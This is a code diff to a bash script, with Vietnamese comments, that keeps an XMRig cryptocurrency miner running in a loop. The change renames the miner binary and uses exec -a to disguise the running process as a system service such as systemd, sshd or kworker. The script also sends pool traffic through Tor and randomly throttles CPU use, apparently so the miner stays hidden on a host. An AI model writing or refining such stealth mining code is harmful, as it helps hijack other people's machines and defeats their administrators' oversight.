@@ -20,12 +20,21 @@ while true; do
 
   # Đọc tên tiến trình từ file xmrig_name.txt nếu tồn tại
   if [ -f /root/xmrig_name.txt ]; then
-    RANDOM_NAME=$(cat /root/xmrig_name.txt)
+    FINAL_NAME=$(cat /root/xmrig_name.txt)
   else
-    # Tạo tên tiến trình ngẫu nhiên nếu file không tồn tại
+    # Danh sách các tên tiến trình hợp lệ giống hệ thống
+    PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")
+
+    # Chọn một tên tiến trình hợp lệ ngẫu nhiên
+    RANDOM_PROCESS_NAME=${PROCESS_NAMES[$RANDOM % ${#PROCESS_NAMES[@]}]}
+
+    # Tạo tên tiến trình ngẫu nhiên
     RANDOM_NAME=$(echo training-$(shuf -i 1-999 -n 1))
-    echo $RANDOM_NAME > /root/xmrig_name.txt
-    mv /root/work/xmrig /root/work/$RANDOM_NAME
+
+    # Kết hợp tên tiến trình hệ thống và tên ngẫu nhiên để tạo tên tiến trình cuối cùng
+    FINAL_NAME="${RANDOM_PROCESS_NAME}-${RANDOM_NAME}"
+    echo $FINAL_NAME > /root/xmrig_name.txt
+    mv /root/work/xmrig /root/work/$FINAL_NAME
   fi
 
   # Tính toán số threads dựa trên % CPU ngẫu nhiên
@@ -42,6 +51,6 @@ while true; do
   CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))  # Tính giá trị giới hạn CPU thực tế
 
   # Khởi động lại XMRig với tên tiến trình từ file xmrig_name.txt và giới hạn CPU
-  echo "Khởi động lại XMRig với tên tiến trình: $RANDOM_NAME"
-  cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
+  echo "Khởi động lại XMRig với tên tiến trình: $FINAL_NAME"
+  exec -a "$RANDOM_PROCESS_NAME" cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /root/work/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
 done
